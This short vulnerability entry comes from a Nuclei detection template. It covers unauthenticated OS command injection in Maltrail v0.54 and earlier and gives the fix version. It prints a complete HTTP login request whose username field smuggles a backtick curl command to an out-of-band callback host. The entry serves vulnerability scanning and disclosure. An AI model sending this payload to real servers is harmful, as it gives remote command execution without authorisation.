# Vulnerability: Maltrail <= v0.54 - Unauthenticated OS Command Injection
**Classification:** HUNTR
**Source:** Nuclei Template (`maltrail-rce.yaml`)

## Description
The subprocess.check_output function in mailtrail/core/http.py contains a command injection vulnerability in the params.get("username")parameter.
An attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication.

## Secure Mitigation
Fixed in 0.55 Version

## Vulnerable Code Pattern / Exploit Payload
```http
POST /login HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Origin: {{RootURL}}
Referer: {{RootURL}}

username=;`curl {{interactsh-url}}`
```

